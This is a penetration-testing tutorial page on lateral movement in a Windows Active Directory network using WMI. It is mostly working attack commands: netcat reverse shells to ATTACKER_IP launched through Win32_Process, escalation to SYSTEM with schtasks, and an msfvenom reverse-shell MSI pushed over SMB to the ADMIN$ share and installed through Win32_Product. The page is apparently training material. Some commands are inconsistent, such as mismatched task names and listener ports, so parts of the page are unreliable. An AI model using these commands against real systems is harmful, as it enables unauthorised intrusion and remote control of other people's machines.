# Example

Refer to the section labelled ["Example scenario"](https://jarrettgxz-sec.gitbook.io/penetration-testing-ethical-hacking-concepts/windows-active-directory/lateral-movement-and-pivoting/example-scenario) to understand the setup we will be working with. The following will illustrate an example of how we can use WMI to move laterally in a network.

### (1) Using `Win_32_Process`

It appears that this method does not directly provide us with a shell session as the privileged `nt authority\system` user immediately. We need to perform certain privilege escalation steps (with the administrator credentials) to gain a privileged shell.

For the sake of simplicity, we will assume that the machine has the netcat binary installed in `C:\tools\nc64.exe`.

#### 1.  Start a listener on the attacker machine

```sh
$ nc -lvnp 9999
```

> Take note of the port number used in this step

#### 2. Create a new WMI session against our target machine (`iis.test.com`) and invoke the Create method from the `Win32_Process` class:

> This step should be performed from an "intermediary" machine in the network that we have compromised (`jmp.test.com`)

a. Create WMI session:

{% code overflow="wrap" %}
```powershell
PS C:\> $username = 'admin';
PS C:\> $password = 'pass';
PS C:\> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
PS C:\> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;

PS C:\> $Opt = New-CimSessionOption -Protocol Dcom
PS C:\> $Session = New-CimSession -ComputerName iis.test.com -Credential $credential -SessionOption $Opt -ErrorAction Stop 
```
{% endcode %}

b. Invoke `Win32_Process` Create method:

{% code overflow="wrap" %}
```powershell
PS> $Command = "c:\tools\nc64.exe ATTACKER_IP 9999 -e cmd.exe"

PS> Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{ 
CommandLine = $Command 
}
```
{% endcode %}

Now, we should retrieve a remote shell on the listener we established previously:

* Note that we have obtained a shell as the admin user, but not the highest privileged system user yet

```
C:\> whoami
admin
```

#### 3. Escalate privilege to the highest privileged system user (`SYSTEM`):

#### 3.1 Using `schtasks`

a. Start a listener on the attacker machine (on a separate port from the previously used one):

{% code overflow="wrap" %}
```sh
$ nc -lvnp 6666
```
{% endcode %}

b. Create and start a new task as the `SYSTEM` user:

{% code overflow="wrap" %}
```powershell
C:\> schtasks /ru "SYSTEM" /create /tn "rooty" /tr "c:\tools\nc64.exe ATTACKER_IP 6666" /ru "SYSTEM" flag
```
{% endcode %}

{% code overflow="wrap" %}
```powershell
C:\> schtasks /tn "privsec" /run
```
{% endcode %}

Now, we should receive a shell as the `SYSTEM` user:

```powershell
C:\> whoami
nt authority\system
```

#### 3.2 Using `sc.exe`&#x20;

...



### (2) Using `.msi` packages and `Win32_Product`

#### 1. Craft the reverse shell payload (`msfvenom`) in the `.msi` format

{% code title="Attacker" overflow="wrap" %}
```sh
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=8888 -f msi -o rvshell.msi
```
{% endcode %}

> Take note of the value passed to the `LPORT` option

#### 2. Copy the payload over to the target machine using _SMB_ (or any other methods available):

{% code title="Attacker" overflow="wrap" %}
```sh
# lets first identify the name of the admin share
$ smbclient -U admin -W test.com -L '//iis.test.com'
Sharename       Type      Comment
---------       ----      -------
 ADMIN$         Disk      Remote Admin
...


$ smbclient -c "put <msi_name>.msi -U admin -W test.com '//iis.test.com/ADMIN$'
```
{% endcode %}

> Replace `service_exec_name>.exe` with the name of the `.msi` file created with `msfvenom`

_Start the msfconsole listener (used to catch the shell in one of the later step):_

{% code title="Attacker" overflow="wrap" %}
```sh
$ msfconsole
msf6> use exploit/multi/handler
msf6 exploit(multi/handler) > set LHOST <local_addr>
msf6 exploit(multi/handler) > set LPORT 9999
msf6 exploit(multi/handler) > set payload windows/shell/reverse_tcp
msf6 exploit(multi/handler) > run
```
{% endcode %}

#### 3. Create a new WMI session against our target machine (`iis.test.com`) and invoke the Install method from the `Win32_Product` class:

> This step should be performed from an "intermediary" machine in the network that we have compromised (`jmp.test.com`)

a. Create WMI session

Follow the steps as shown in "part (1) Using `Win32_Process` " above.

b. Invoke `Win32_Product` Install method:

{% code overflow="wrap" %}
```powershell
PS> Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{
PackageLocation = "C:\Windows\<installed_msi>.msi";
Options = "";
AllUsers = $false
}
```
{% endcode %}

After executing the above commands, we should receive a connection on the `msfconsole` listener we have established earlier:

{% code title="msfconsole" overflow="wrap" %}
```powershell
C:\> whoami
nt authority\system
```
{% endcode %}

